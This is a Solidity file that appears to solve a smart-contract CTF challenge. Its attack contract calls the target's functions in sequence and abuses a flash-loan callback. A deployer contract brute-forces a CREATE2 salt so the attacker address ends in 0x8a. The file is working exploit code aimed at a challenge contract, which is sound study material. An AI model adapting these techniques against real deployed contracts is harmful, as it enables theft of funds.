//SPDX-License-Identifier:UNLICENSED
pragma solidity ^0.8.0;
import "./function.sol";
//依次调用func中的四个函数即可
contract fig{
    check public fun;
    constructor(address payable _fun){
        fun = check(_fun);
    } 
    function figure()public pure returns(bytes memory){
        return abi.encodeWithSignature("com()");
    }

    function attack()public payable{
        (bool success,)=address(fun).call{value:1}("");
        require(success,"call failed");
        fun.pul();
        fun.ownerPrivalege();
        fun.ext();
        fun.flashLoan(address(fun),0,figure());
        complete();
    }

    function complete()public{
        fun.isCompleted();
    }
}

contract deploy{
    fig public fi;
    address payable fun;
    bytes byteCode = type(fig).creationCode;
    bytes creatCode;
    constructor(address payable _fun){
        fun = _fun;
        creatCode = abi.encodePacked(type(fig).creationCode,abi.encode(fun));
    }
    function figSalt()public returns(bytes32){
        uint256 salt;
        address addr;
        for(uint i=0;i>=0;){
            addr = address(uint160(uint256(keccak256(abi.encodePacked(uint8(0xff),address(this),bytes32(salt),keccak256(creatCode))))));
            if(uint160(addr)&0xff==uint8(0x8a)){
                break;
            }
            salt+=1;
        }
        return(bytes32(salt));
    }

    function deployed()public{
            fi = new fig{salt : figSalt()}(fun);
            
    }

    function getHash()public view returns(bytes32){
        return keccak256(creatCode);
    }
}
